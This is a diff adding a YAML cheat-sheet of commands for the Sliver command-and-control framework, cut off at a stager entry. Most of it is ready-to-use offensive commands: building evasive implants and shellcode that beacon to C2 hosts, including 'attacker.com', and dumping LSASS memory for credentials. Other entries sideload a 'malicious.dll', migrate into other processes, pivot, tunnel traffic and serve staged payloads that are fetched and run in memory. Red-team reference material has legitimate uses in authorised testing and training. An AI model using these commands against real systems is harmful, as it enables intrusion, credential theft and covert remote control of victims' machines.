@@ -1,0 +1,1027 @@
+tool: sliver
+tags: [c2, framework, post-exploitation, red-team, pentest, implant, beacon, session, mTLS, HTTP, HTTPS, DNS, WireGuard, pivoting, stager, BOF, COFF]
+
+actions:
+  # ============================================================================
+  # GETTING STARTED
+  # ============================================================================
+  
+  - title: sliver - start server
+    desc: |
+      Start the Sliver C2 server. The server manages implants, sessions, beacons,
+      and all C2 infrastructure. Run this on your C2 server host (preferably Linux/MacOS).
+      The server will generate certificates and keys automatically on first run.
+    command: "sliver-server"
+
+  - title: sliver - start client and connect
+    desc: |
+      Start the Sliver client and connect to a server. The client will prompt you
+      to select a server configuration if multiple configs are available. Client
+      connects to server via gRPC/mTLS on port 31337 by default.
+    command: "sliver-client"
+
+  - title: sliver - show help
+    desc: |
+      Display general help and list all available commands. Shows command categories
+      including generate, sessions, beacons, jobs, and more.
+    command: "sliver > help"
+
+  - title: sliver - show command help
+    desc: |
+      Display detailed help for a specific command. Shows all available flags,
+      arguments, and usage examples for the command.
+    command: "sliver > {{command|generate}} --help"
+
+  - title: sliver - show version
+    desc: |
+      Display Sliver version information. Useful for checking installed version
+      or reporting issues.
+    command: "sliver > version"
+
+  # ============================================================================
+  # IMPLANT GENERATION - BASIC
+  # ============================================================================
+
+  - title: sliver - generate mTLS implant (session mode)
+    desc: |
+      Generate a Sliver implant using Mutual TLS (mTLS) C2 in session mode.
+      Session mode provides real-time interactive communication. mTLS is the most
+      secure and recommended C2 protocol. The implant will connect to the specified
+      domain/IP on port 8888 by default.
+    command: "sliver > generate --mtls {{domain|example.com}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate mTLS implant (beacon mode)
+    desc: |
+      Generate a Sliver implant using mTLS C2 in beacon mode. Beacon mode uses
+      asynchronous check-ins where the implant periodically polls for tasks.
+      More stealthy but less responsive than session mode. Default check-in is 60s.
+    command: "sliver > generate --mtls {{domain|example.com}} --save {{output_dir|/tmp}} --beacon"
+
+  - title: sliver - generate HTTP implant
+    desc: |
+      Generate a Sliver implant using HTTP(S) C2. The implant will attempt HTTPS
+      first, then fall back to HTTP if HTTPS fails. HTTP C2 supports proxy-aware
+      connections and can blend in with normal web traffic.
+    command: "sliver > generate --http {{domain|example.com}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate HTTPS implant
+    desc: |
+      Generate a Sliver implant using HTTPS C2. Requires SSL/TLS certificate
+      configuration. Can use Let's Encrypt for automatic certificate generation
+      or provide custom certificates.
+    command: "sliver > generate --https {{domain|example.com}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate DNS implant
+    desc: |
+      Generate a Sliver implant using DNS C2. Useful for highly restricted networks
+      where only DNS queries are allowed. Slower than other protocols but can bypass
+      network restrictions. Always use FQDN (with trailing dot) for DNS domains.
+    command: "sliver > generate --dns {{fqdn|1.example.com.}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate WireGuard implant
+    desc: |
+      Generate a Sliver implant using WireGuard C2. WireGuard provides fast, encrypted
+      VPN-like connectivity. Requires WireGuard listener setup and client configuration.
+      Best performance for port forwarding and SOCKS proxies.
+    command: "sliver > generate --wg {{lhost|192.168.1.100}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate for specific OS/arch
+    desc: |
+      Generate an implant for a specific operating system and architecture.
+      Sliver supports cross-compilation for Windows, Linux, and MacOS on multiple
+      architectures (amd64, 386, arm64, etc.). Use --os and --arch flags.
+    command: "sliver > generate --mtls {{domain|example.com}} --os {{os|windows}} --arch {{arch|amd64}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate with multiple C2 endpoints
+    desc: |
+      Generate an implant with multiple C2 endpoints for redundancy. The implant
+      will try each endpoint in sequence (or randomly based on strategy). Useful for
+      failover scenarios or multi-domain setups.
+    command: "sliver > generate --mtls {{domain1|example.com}} --http {{domain2|attacker.com}} --dns {{fqdn|1.example.com.}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate with connection strategy
+    desc: |
+      Set the connection strategy for multiple endpoints. 's' = sequential (default,
+      tries in order), 'r' = random (randomly selects endpoint), 'rd' = random domain
+      (random domain but sequential protocol). Sequential is most performant.
+    command: "sliver > generate --mtls {{domain1|foo.com}} --mtls {{domain2|bar.com}} --strategy {{strategy|r}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate with custom beacon interval
+    desc: |
+      Set custom beacon check-in interval for beacon mode implants. Default is 60s.
+      Lower intervals = faster response but more network traffic. Higher intervals
+      = more stealthy but slower task execution. Format: 30s, 5m, 1h, etc.
+    command: "sliver > generate --mtls {{domain|example.com}} --beacon --seconds {{interval|30}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate with jitter
+    desc: |
+      Add random jitter to beacon check-in intervals. Jitter randomizes the check-in
+      time to avoid predictable patterns. Format: percentage (0-100) or duration.
+      Helps avoid detection by timing analysis.
+    command: "sliver > generate --mtls {{domain|example.com}} --beacon --jitter {{jitter|30}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate with debug symbols
+    desc: |
+      Generate an implant with debug symbols enabled. Useful for troubleshooting
+      connection issues or development. Debug builds are larger and easier to detect.
+      Only use during testing, not in production engagements.
+    command: "sliver > generate --mtls {{domain|example.com}} --debug --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate shellcode format
+    desc: |
+      Generate an implant in shellcode format instead of executable. Shellcode can
+      be injected into processes or used with stagers. Requires MinGW for Windows
+      shellcode generation. Format options: EXECUTABLE, SHARED_LIB, SHELLCODE.
+    command: "sliver > generate --mtls {{domain|example.com}} --format {{format|shellcode}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate DLL format
+    desc: |
+      Generate an implant as a Windows DLL (shared library). DLLs can be loaded via
+      rundll32, regsvr32, or sideloaded into processes. Useful for evasion and
+      persistence techniques. Requires MinGW on the server.
+    command: "sliver > generate --mtls {{domain|example.com}} --format {{format|shared}} --os windows --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate with obfuscation disabled
+    desc: |
+      Generate an implant with symbol obfuscation disabled. Obfuscation makes static
+      analysis harder but increases compile time and memory usage. Disable for faster
+      builds or compatibility issues.
+    command: "sliver > generate --mtls {{domain|example.com}} --skip-symbols --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate with canary domains
+    desc: |
+      Add canary domains to the implant. Canary domains are unique per-binary domains
+      that are deliberately not obfuscated. If these domains are ever resolved (and you
+      have a DNS listener), you'll get an alert indicating the binary was discovered.
+    command: "sliver > generate --mtls {{domain|example.com}} --canary {{canary|1.example.com.}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - list generated implants
+    desc: |
+      List all previously generated implants. Shows implant names (code names),
+      OS/architecture, debug status, format, and other metadata. Useful for tracking
+      which implants were generated and their configurations.
+    command: "sliver > implants"
+
+  - title: sliver - regenerate existing implant
+    desc: |
+      Regenerate a previously created implant using the same configuration. Useful
+      if you need to re-download an implant or regenerate with same settings.
+      Positional arguments (implant name) come after flags.
+    command: "sliver > regenerate --save {{output_dir|/tmp}} {{implant_name|NEW_GRAPE}}"
+
+  # ============================================================================
+  # LISTENERS
+  # ============================================================================
+
+  - title: sliver - start mTLS listener
+    desc: |
+      Start an mTLS listener on the default port 8888. mTLS listeners accept connections
+      from implants generated with --mtls. The server automatically manages certificates.
+      Listeners run as background jobs and persist until stopped.
+    command: "sliver > mtls"
+
+  - title: sliver - start mTLS listener on custom port
+    desc: |
+      Start an mTLS listener on a custom port. Useful when default port 8888 is blocked
+      or you need multiple listeners. Ensure firewall rules allow the port.
+    command: "sliver > mtls --lhost {{ip|0.0.0.0}} --lport {{port|9999}}"
+
+  - title: sliver - start HTTP listener
+    desc: |
+      Start an HTTP listener on port 80. HTTP listeners accept connections from implants
+      generated with --http. The listener responds to any domain by default. Can be
+      restricted to specific domains using --domain flag.
+    command: "sliver > http"
+
+  - title: sliver - start HTTP listener with domain restriction
+    desc: |
+      Start an HTTP listener restricted to a specific domain. Only responds to requests
+      with the specified Host header. Useful for multi-domain setups or when using
+      redirectors. Each listener can only accept one domain.
+    command: "sliver > http --domain {{domain|example.com}}"
+
+  - title: sliver - start HTTP listener with static website
+    desc: |
+      Start an HTTP listener with static website content. Makes the server look legitimate
+      by serving fake content (e.g., default IIS page). Website content is managed via
+      the 'websites' command. Useful for blending in with normal web traffic.
+    command: "sliver > http --domain {{domain|example.com}} --website {{website_name|fake-blog}}"
+
+  - title: sliver - start HTTPS listener
+    desc: |
+      Start an HTTPS listener on port 443. HTTPS listeners require SSL/TLS certificates.
+      By default uses self-signed certificates. Can use Let's Encrypt for automatic
+      certificates or provide custom cert/key pairs.
+    command: "sliver > https --domain {{domain|example.com}}"
+
+  - title: sliver - start HTTPS listener with Let's Encrypt
+    desc: |
+      Start an HTTPS listener with automatic Let's Encrypt certificate generation.
+      Requires public DNS pointing to the server and ability to bind to port 80/443.
+      Certificates are automatically renewed. Best for production C2 infrastructure.
+    command: "sliver > https --domain {{domain|example.com}} --lets-encrypt"
+
+  - title: sliver - start HTTPS listener with custom certificate
+    desc: |
+      Start an HTTPS listener with custom SSL/TLS certificate and key. Provide paths
+      to PEM-encoded certificate and private key files. Useful when you have your own
+      certificates or need specific certificate properties.
+    command: "sliver > https --domain {{domain|example.com}} --cert {{cert_path|./cert.pem}} --key {{key_path|./key.pem}}"
+
+  - title: sliver - start DNS listener
+    desc: |
+      Start a DNS listener for DNS C2. Requires proper DNS configuration (A records,
+      NS records) pointing to the server. Always use FQDN (with trailing dot) when
+      specifying domains. Listener binds to UDP port 53.
+    command: "sliver > dns --domains {{fqdn|1.example.com.}}"
+
+  - title: sliver - start DNS listener with multiple domains
+    desc: |
+      Start a DNS listener for multiple parent domains. Useful when managing multiple
+      DNS C2 domains or subdomains. Each domain must be properly configured in DNS.
+    command: "sliver > dns --domains {{fqdn1|1.example.com.}} {{fqdn2|2.example.com.}}"
+
+  - title: sliver - start WireGuard listener
+    desc: |
+      Start a WireGuard listener for WireGuard C2. WireGuard provides fast, encrypted
+      VPN-like connectivity. Default port is UDP 53. Requires client configuration
+      setup using 'wg-config' command. Best for port forwarding and SOCKS proxies.
+    command: "sliver > wg"
+
+  - title: sliver - start WireGuard listener on custom port
+    desc: |
+      Start a WireGuard listener on a custom UDP port. Useful when port 53 is blocked
+      or you need multiple WireGuard listeners. Ensure firewall allows the port.
+    command: "sliver > wg --lport {{port|51820}}"
+
+  - title: sliver - list active jobs/listeners
+    desc: |
+      List all active background jobs including listeners. Shows job ID, name, protocol,
+      and port. Jobs persist until explicitly stopped. Use job IDs to manage listeners.
+    command: "sliver > jobs"
+
+  - title: sliver - stop a job/listener
+    desc: |
+      Stop a specific background job by ID. Use 'jobs' command to see active job IDs.
+      Stopping a listener will prevent new implants from connecting but won't affect
+      existing sessions/beacons.
+    command: "sliver > jobs --kill {{job_id|1}}"
+
+  # ============================================================================
+  # SESSIONS & BEACONS
+  # ============================================================================
+
+  - title: sliver - list active sessions
+    desc: |
+      List all active interactive sessions. Sessions provide real-time bidirectional
+      communication. Shows session ID, name, transport, remote address, hostname,
+      username, OS, last check-in, and health status.
+    command: "sliver > sessions"
+
+  - title: sliver - list active beacons
+    desc: |
+      List all active beacons. Beacons use asynchronous check-ins. Shows beacon ID,
+      name, task queue, transport, remote address, hostname, username, OS, last check-in,
+      and next check-in time (with jitter).
+    command: "sliver > beacons"
+
+  - title: sliver - watch beacons in real-time
+    desc: |
+      Watch beacons in real-time. Continuously displays beacon check-ins and status
+      updates. Useful for monitoring beacon activity. Press Ctrl+C to stop watching.
+    command: "sliver > beacons watch"
+
+  - title: sliver - interact with session
+    desc: |
+      Interact with a specific session. Use session ID (full or prefix) or session name.
+      Tab completion is available for session identifiers. After interaction, prompt
+      changes to show active session name. Use 'background' to return to main prompt.
+    command: "sliver > use {{session_id|8ff2ce4c}}"
+
+  - title: sliver - interact with beacon
+    desc: |
+      Interact with a specific beacon. Use beacon ID (full or prefix) or beacon name.
+      Tab completion is available for beacon identifiers. Beacon prompt is blue (vs
+      red for sessions). Commands execute asynchronously and return results on next check-in.
+    command: "sliver > use {{beacon_id|8c465643}}"
+
+  - title: sliver - switch beacon to interactive session
+    desc: |
+      Task a beacon to open an interactive session. The beacon will establish a real-time
+      connection over its active C2 protocol. Can only use protocols compiled into the
+      implant. Use 'close' command to close the session without killing the beacon.
+    command: "sliver (BEACON_NAME) > interactive"
+
+  - title: sliver - switch beacon to interactive session with alternative endpoint
+    desc: |
+      Task a beacon to open an interactive session using an alternative endpoint.
+      Useful when you want to use a different domain or redirector. The endpoint must
+      use a protocol that was compiled into the implant.
+    command: "sliver (BEACON_NAME) > interactive --mtls {{endpoint|redirector.example.com:8888}}"
+
+  - title: sliver - close interactive session
+    desc: |
+      Close an interactive session opened from a beacon. The beacon will continue
+      performing check-ins while the session is open. Closing the session returns
+      the beacon to asynchronous mode without killing the implant.
+    command: "sliver (BEACON_NAME) > close"
+
+  - title: sliver - background current session/beacon
+    desc: |
+      Return to main prompt without disconnecting from the current session/beacon.
+      The session/beacon remains active and you can interact with it again later.
+      Useful for managing multiple sessions simultaneously.
+    command: "sliver (SESSION_NAME) > background"
+
+  - title: sliver - view beacon tasks
+    desc: |
+      View all tasks executed by the active beacon. Shows task ID, state, message type,
+      created time, sent time, and completed time. Tasks execute in FIFO order. Use
+      'tasks fetch' to retrieve output from specific tasks.
+    command: "sliver (BEACON_NAME) > tasks"
+
+  - title: sliver - fetch task output
+    desc: |
+      Fetch output from a specific completed task. Presents interactive menu to select
+      task. Useful for retrieving results from long-running tasks or tasks executed by
+      other operators in multiplayer mode.
+    command: "sliver (BEACON_NAME) > tasks fetch"
+
+  # ============================================================================
+  # FILE OPERATIONS
+  # ============================================================================
+
+  - title: sliver - list directory contents
+    desc: |
+      List files and directories in the current working directory on the target.
+      Shows file names, sizes, permissions, and modification times. Similar to 'ls'
+      or 'dir' commands.
+    command: "sliver (SESSION_NAME) > ls"
+
+  - title: sliver - list directory with path
+    desc: |
+      List files and directories in a specific path. Can use absolute or relative
+      paths. Works on both Windows and Unix-like systems.
+    command: "sliver (SESSION_NAME) > ls {{path|C:\\Users}}"
+
+  - title: sliver - change directory
+    desc: |
+      Change the current working directory on the target. Use absolute or relative
+      paths. Changes directory context for subsequent file operations.
+    command: "sliver (SESSION_NAME) > cd {{path|C:\\Users\\Public}}"
+
+  - title: sliver - print working directory
+    desc: |
+      Print the current working directory on the target. Shows full path to current
+      directory. Useful for orientation and scripting.
+    command: "sliver (SESSION_NAME) > pwd"
+
+  - title: sliver - display file contents
+    desc: |
+      Display the contents of a file on the target. Reads and displays file content
+      to console. Useful for reading configuration files, logs, or small text files.
+    command: "sliver (SESSION_NAME) > cat {{file_path|C:\\Windows\\System32\\drivers\\etc\\hosts}}"
+
+  - title: sliver - download file from target
+    desc: |
+      Download a file from the target to the local machine. File is saved to the
+      current working directory or specified path. Shows download progress and file size.
+    command: "sliver (SESSION_NAME) > download {{remote_path|C:\\Users\\Desktop\\file.txt}}"
+
+  - title: sliver - download file to specific path
+    desc: |
+      Download a file from the target to a specific local path. Useful for organizing
+      downloaded files or saving to a specific location. Creates directories if needed.
+    command: "sliver (SESSION_NAME) > download {{remote_path|C:\\Users\\Desktop\\file.txt}} --save {{local_path|/tmp/file.txt}}"
+
+  - title: sliver - upload file to target
+    desc: |
+      Upload a file from the local machine to the target. File is uploaded to the
+      current working directory on the target or specified path. Shows upload progress.
+    command: "sliver (SESSION_NAME) > upload {{local_path|/tmp/payload.exe}}"
+
+  - title: sliver - upload file to specific path
+    desc: |
+      Upload a file to a specific path on the target. Useful for placing files in
+      specific locations. Creates directories if needed. Can overwrite existing files.
+    command: "sliver (SESSION_NAME) > upload {{local_path|/tmp/payload.exe}} --save {{remote_path|C:\\Users\\Public\\payload.exe}}"
+
+  - title: sliver - create directory
+    desc: |
+      Create a new directory on the target. Creates single directory or full path
+      (with --p flag). Useful for organizing files or creating staging directories.
+    command: "sliver (SESSION_NAME) > mkdir {{path|C:\\Temp\\Staging}}"
+
+  - title: sliver - create directory tree
+    desc: |
+      Create a directory tree (parent directories). Automatically creates all
+      necessary parent directories if they don't exist. Useful for creating nested
+      directory structures.
+    command: "sliver (SESSION_NAME) > mkdir --p {{path|C:\\Temp\\Staging\\Subdir}}"
+
+  - title: sliver - remove file
+    desc: |
+      Delete a file on the target. Permanently removes the file. Use with caution.
+      Cannot delete directories (use 'rmdir' for directories).
+    command: "sliver (SESSION_NAME) > rm {{file_path|C:\\Temp\\file.txt}}"
+
+  - title: sliver - remove directory
+    desc: |
+      Remove an empty directory on the target. Directory must be empty. Use 'rm -r'
+      to remove directories with contents (recursive).
+    command: "sliver (SESSION_NAME) > rmdir {{path|C:\\Temp\\EmptyDir}}"
+
+  - title: sliver - remove directory recursively
+    desc: |
+      Remove a directory and all its contents recursively. Deletes directory tree
+      including all files and subdirectories. Use with extreme caution.
+    command: "sliver (SESSION_NAME) > rm -r {{path|C:\\Temp\\Staging}}"
+
+  - title: sliver - move/rename file
+    desc: |
+      Move or rename a file on the target. Can move files to different directories
+      or rename them. Preserves file contents and metadata.
+    command: "sliver (SESSION_NAME) > mv {{source|C:\\Temp\\old.txt}} {{dest|C:\\Temp\\new.txt}}"
+
+  - title: sliver - copy file
+    desc: |
+      Copy a file on the target. Creates a duplicate of the file at the destination.
+      Original file remains unchanged. Useful for backups or creating multiple copies.
+    command: "sliver (SESSION_NAME) > cp {{source|C:\\Temp\\file.txt}} {{dest|C:\\Temp\\backup.txt}}"
+
+  # ============================================================================
+  # PROCESS OPERATIONS
+  # ============================================================================
+
+  - title: sliver - list processes
+    desc: |
+      List running processes on the target. Shows PID, PPID, name, user, architecture,
+      and other process information. Similar to 'ps' or 'tasklist' commands.
+    command: "sliver (SESSION_NAME) > ps"
+
+  - title: sliver - execute command
+    desc: |
+      Execute a command on the target and return output. Runs command in a new process
+      and captures stdout/stderr. Output is displayed when command completes.
+    command: "sliver (SESSION_NAME) > execute {{command|whoami}}"
+
+  - title: sliver - execute command with arguments
+    desc: |
+      Execute a command with arguments. Arguments are passed to the command as-is.
+      Useful for running system commands, scripts, or binaries with parameters.
+    command: "sliver (SESSION_NAME) > execute {{command|powershell.exe}} {{args|-Command Get-Process}}"
+
+  - title: sliver - execute command and save output
+    desc: |
+      Execute a command and save output to loot store. Useful for capturing command
+      output for later analysis or reporting. Output is stored server-side and shared
+      in multiplayer mode.
+    command: "sliver (SESSION_NAME) > execute {{command|whoami /all}} --loot"
+
+  - title: sliver - get interactive shell
+    desc: |
+      Spawn an interactive shell on the target. Provides a native shell (cmd.exe on
+      Windows, /bin/sh on Unix). Only works in session mode, not beacon mode. Use
+      'exit' to leave the shell.
+    command: "sliver (SESSION_NAME) > shell"
+
+  - title: sliver - migrate to process
+    desc: |
+      Migrate the implant to a different process. The implant injects into the target
+      process and continues execution there. Useful for process hollowing, evading
+      detection, or moving to a more privileged process. Only works in session mode.
+    command: "sliver (SESSION_NAME) > migrate {{pid|1234}}"
+
+  - title: sliver - dump process memory
+    desc: |
+      Dump the memory of a process to a file. Useful for extracting credentials from
+      process memory (e.g., LSASS on Windows). Creates a memory dump file that can be
+      analyzed offline or with tools like Mimikatz.
+    command: "sliver (SESSION_NAME) > procdump --pid {{pid|1234}} --save {{output|C:\\Temp\\dump.dmp}}"
+
+  - title: sliver - dump process memory by name
+    desc: |
+      Dump process memory by process name instead of PID. Finds the first process
+      matching the name and dumps its memory. Useful when PID is unknown or changes.
+    command: "sliver (SESSION_NAME) > procdump --name {{process_name|lsass.exe}} --save {{output|C:\\Temp\\lsass.dmp}}"
+
+  - title: sliver - execute assembly (in-memory)
+    desc: |
+      Execute a .NET assembly in-memory without writing to disk. Loads the assembly
+      into the current process and executes it. Useful for running tools like Rubeus,
+      Seatbelt, or SharpHound without touching disk. Only works on Windows.
+    command: "sliver (SESSION_NAME) > execute-assembly {{assembly_path|/tmp/Rubeus.exe}} {{args|dump}}"
+
+  - title: sliver - execute assembly and save output
+    desc: |
+      Execute a .NET assembly and save output to loot store. Captures stdout/stderr
+      from the assembly execution. Useful for storing enumeration results or tool
+      output for later analysis.
+    command: "sliver (SESSION_NAME) > execute-assembly {{assembly_path|/tmp/Seatbelt.exe}} --loot"
+
+  - title: sliver - sideload DLL
+    desc: |
+      Sideload a DLL into a process. Loads the DLL into the target process without
+      writing to disk (or with minimal disk writes). Useful for loading malicious
+      DLLs or tools into trusted processes. Only works on Windows.
+    command: "sliver (SESSION_NAME) > sideload {{dll_path|/tmp/malicious.dll}} --process {{process_name|notepad.exe}}"
+
+  - title: sliver - spawn process
+    desc: |
+      Spawn a new process on the target. Creates a new process with specified command
+      and arguments. The process runs independently of the implant. Useful for
+      executing commands in a separate process context.
+    command: "sliver (SESSION_NAME) > spawn {{process_name|notepad.exe}}"
+
+  # ============================================================================
+  # NETWORK OPERATIONS
+  # ============================================================================
+
+  - title: sliver - add port forward
+    desc: |
+      Create a port forward to tunnel TCP connections through the implant. Forwards
+      connections from local machine to remote target. Works over any C2 protocol
+      (in-band tunneling). Default binds to 127.0.0.1.
+    command: "sliver (SESSION_NAME) > portfwd add --remote {{remote_ip|10.10.10.10}}:{{remote_port|22}}"
+
+  - title: sliver - add port forward with custom bind
+    desc: |
+      Create a port forward with custom bind address and port. Useful when you need
+      to bind to a specific interface or port. The forward maps local:port to remote:port.
+    command: "sliver (SESSION_NAME) > portfwd add --bind {{bind_ip|127.0.0.1}}:{{bind_port|8080}} --remote {{remote_ip|10.10.10.10}}:{{remote_port|3389}}"
+
+  - title: sliver - list port forwards
+    desc: |
+      List all active port forwards for the current session. Shows forward ID, bind
+      address, and remote address. Use forward IDs to manage forwards.
+    command: "sliver (SESSION_NAME) > portfwd"
+
+  - title: sliver - remove port forward
+    desc: |
+      Remove a port forward by ID. Stops forwarding connections for the specified
+      forward. Use 'portfwd' command to see active forward IDs.
+    command: "sliver (SESSION_NAME) > portfwd rm {{forward_id|1}}"
+
+  - title: sliver - add reverse port forward
+    desc: |
+      Create a reverse port forward (rportfwd). Forwards connections from the target
+      to your local machine. Useful when the target can reach you but you can't reach
+      the target directly. Available in Sliver v1.5.27+.
+    command: "sliver (SESSION_NAME) > rportfwd add --remote {{remote_ip|127.0.0.1}}:{{remote_port|3389}} --bind {{bind_port|13389}}"
+
+  - title: sliver - start SOCKS5 proxy
+    desc: |
+      Start an in-band SOCKS5 proxy through the implant. Tunnels all SOCKS traffic
+      through the C2 channel. Works over any C2 protocol. Default binds to 127.0.0.1:1081.
+      Can be unstable depending on protocol.
+    command: "sliver (SESSION_NAME) > socks5 add"
+
+  - title: sliver - start SOCKS5 proxy with custom bind
+    desc: |
+      Start a SOCKS5 proxy with custom bind address and port. Useful when you need
+      a specific bind configuration. SOCKS5 proxies tunnel all traffic through the
+      C2 channel (in-band).
+    command: "sliver (SESSION_NAME) > socks5 add --bind {{bind_ip|127.0.0.1}}:{{bind_port|1080}}"
+
+  - title: sliver - list SOCKS5 proxies
+    desc: |
+      List all active SOCKS5 proxies for the current session. Shows proxy ID, bind
+      address, and status. Use proxy IDs to manage proxies.
+    command: "sliver (SESSION_NAME) > socks5"
+
+  - title: sliver - stop SOCKS5 proxy
+    desc: |
+      Stop a SOCKS5 proxy by ID. Closes the proxy and stops forwarding SOCKS traffic.
+      Use 'socks5' command to see active proxy IDs.
+    command: "sliver (SESSION_NAME) > socks5 rm {{proxy_id|1}}"
+
+  - title: sliver - add WireGuard port forward
+    desc: |
+      Create a WireGuard port forward. Only available when using WireGuard C2.
+      WireGuard port forwards are faster and more reliable than in-band port forwards.
+      Requires WireGuard client configuration setup.
+    command: "sliver (SESSION_NAME) > wg-portfwd add --remote {{remote_ip|10.10.10.10}}:{{remote_port|3389}}"
+
+  - title: sliver - add WireGuard port forward with custom bind
+    desc: |
+      Create a WireGuard port forward with custom bind address. WireGuard forwards
+      use the WireGuard network interface (typically 100.64.0.x). Faster than in-band
+      forwards but requires WireGuard setup.
+    command: "sliver (SESSION_NAME) > wg-portfwd add --bind {{bind_ip|100.64.0.17}}:{{bind_port|1080}} --remote {{remote_ip|10.10.10.10}}:{{remote_port|3389}}"
+
+  - title: sliver - start WireGuard SOCKS5 proxy
+    desc: |
+      Start a WireGuard SOCKS5 proxy. Only available when using WireGuard C2.
+      WireGuard SOCKS proxies are faster and more reliable than in-band SOCKS proxies.
+      Requires WireGuard client configuration setup.
+    command: "sliver (SESSION_NAME) > wg-socks"
+
+  - title: sliver - get WireGuard client config
+    desc: |
+      Generate WireGuard client configuration for connecting to the WireGuard listener.
+      The config can be saved to a file using --save. You'll need to set the Endpoint
+      to point to your Sliver server's WireGuard listener IP and port.
+    command: "sliver > wg-config"
+
+  - title: sliver - get WireGuard client config and save
+    desc: |
+      Generate WireGuard client configuration and save to file. The config file can
+      be used with wg-quick or other WireGuard clients. Remember to set the Endpoint
+      in the config file to your server's IP and port.
+    command: "sliver > wg-config --save {{config_path|./wireguard.conf}}"
+
+  # ============================================================================
+  # PIVOTS
+  # ============================================================================
+
+  - title: sliver - start TCP pivot listener
+    desc: |
+      Start a TCP pivot listener on the current session. Pivots allow other implants
+      to connect through this session, creating a chain of C2 connections. TCP pivots
+      work on all platforms. Default port is 9898.
+    command: "sliver (SESSION_NAME) > pivots tcp"
+
+  - title: sliver - start TCP pivot listener on custom port
+    desc: |
+      Start a TCP pivot listener on a custom port. Useful when default port is blocked
+      or you need multiple pivot listeners. The port should be accessible from the
+      network where you'll deploy the pivot implant.
+    command: "sliver (SESSION_NAME) > pivots tcp --bind {{port|9999}}"
+
+  - title: sliver - start named pipe pivot listener (Windows)
+    desc: |
+      Start a named pipe pivot listener on Windows. Named pipes work over SMB and
+      allow pivoting through Windows sessions. Specify a pipe name with --bind. Only
+      works on Windows sessions.
+    command: "sliver (SESSION_NAME) > pivots named-pipe --bind {{pipe_name|foobar}}"
+
+  - title: sliver - start named pipe pivot with allow all
+    desc: |
+      Start a named pipe pivot listener allowing all users/groups. By default, pipes
+      only allow the current user/group. Use --allow-all to allow all users to connect.
+      Useful in some restricted environments.
+    command: "sliver (SESSION_NAME) > pivots named-pipe --bind {{pipe_name|foobar}} --allow-all"
+
+  - title: sliver - list pivot listeners
+    desc: |
+      List all active pivot listeners. Shows listener ID, protocol, bind address, and
+      number of connected pivots. Use listener IDs to manage pivots.
+    command: "sliver (SESSION_NAME) > pivots"
+
+  - title: sliver - generate TCP pivot implant
+    desc: |
+      Generate an implant that connects through a TCP pivot listener. The implant
+      will connect to the pivot listener IP and port, then tunnel C2 traffic through
+      the pivot. Useful for accessing restricted networks.
+    command: "sliver > generate --mtls {{domain|example.com}} --tcp-pivot {{pivot_ip|192.168.1.1}}:{{pivot_port|9898}} --save {{output_dir|/tmp}}"
+
+  - title: sliver - generate named pipe pivot implant
+    desc: |
+      Generate an implant that connects through a named pipe pivot. The implant will
+      connect to the specified host and pipe name. Syntax is <host>/pipe/<pipe_name>.
+      Use '.' for localhost (127.0.0.1).
+    command: "sliver > generate --mtls {{domain|example.com}} --named-pipe {{host|192.168.1.1}}/pipe/{{pipe_name|foobar}} --save {{output_dir|/tmp}}"
+
+  # ============================================================================
+  # STAGERS
+  # ============================================================================
+
+  - title: sliver - create staging profile
+    desc: |
+      Create a profile for staging. Profiles are implant blueprints that define
+      configuration to be reused. Staging profiles typically use shellcode format.
+      Profiles are used with stage-listener command.
+    command: "sliver > profiles new --mtls {{domain|192.168.122.1}} --format {{format|shellcode}} {{profile_name|win-shellcode}}"
+
+  - title: sliver - start HTTP staging listener
+    desc: |
+      Start an HTTP staging listener. Staging listeners serve stage 2 payloads to
+      stagers. The listener is linked to a profile that defines the stage 2 payload
+      configuration. Stagers download and execute the stage 2 payload in memory.
+    command: "sliver > stage-listener --url {{url|http://192.168.122.1:1234}} --profile {{profile_name|win-shellcode}}"
+
+  - title: sliver - start HTTPS staging listener
+    desc: |
+      Start an HTTPS staging listener. Same as HTTP but uses SSL/TLS encryption.
+      Useful when you need encrypted staging or want to blend in with HTTPS traffic.
+    command: "sliver > stage-listener --url {{url|https://192.168.122.1:8443}} --profile {{profile_name|win-shellcode}}"
+
+  - title: sliver - start TCP staging listener
+    desc: |
+      Start a TCP staging listener. TCP stagers connect directly to the listener
+      and download the stage 2 payload. Format: tcp://IP:PORT.
+    command: "sliver > stage-listener --url {{url|tcp://192.168.122.1:1234}} --profile {{profile_name|win-shellcode}}"
+
+  - title: sliver - start staging listener with prepend size
+    desc: |
+      Start a staging listener with prepended size. Required when using Metasploit
+      stagers (msfvenom). Metasploit stagers expect the payload size to be prepended
+      to the stage 2 payload. Only supported on Windows.
+    command: "sliver > stage-listener --url {{url|http://192.168.122.1:1234}} --profile {{profile_name|win-shellcode}} --prepend-size"
+
+  - title: sliver - start staging listener with encryption
+    desc: |
+      Start a staging listener with AES encryption. The stage 2 payload is encrypted
+      with AES-CBC-128 before being served. Stagers must decrypt the payload before
+      execution. Provides basic obfuscation.
+    command: "sliver > stage-listener --url {{url|http://192.168.0.52:80}} --profile {{profile_name|win-shellcode}} --aes-encrypt-key {{key|D(G+KbPeShVmYq3t}} --aes-encrypt-iv {{iv|8y/B?E(G+KbPeShV}}"
+
+  - title: sliver - start staging listener with compression
+    desc: |
+      Start a staging listener with compression. Compresses the stage 2 payload before
+      serving. Options: zlib, gzip, deflate (level 9). Reduces payload size but
+      stagers must decompress before execution.
+    command: "sliver > stage-listener --url {{url|http://192.168.0.52:80}} --profile {{profile_name|win-shellcode}} --compress {{method|gzip}}"
+
+  - title: sliver - generate stager
+    desc: |
+      Generate a stager payload. Stagers are small initial payloads that download
+      and execute the full stage 2 payload. Useful when the full implant is too
+      large or you need a small initial dropper.
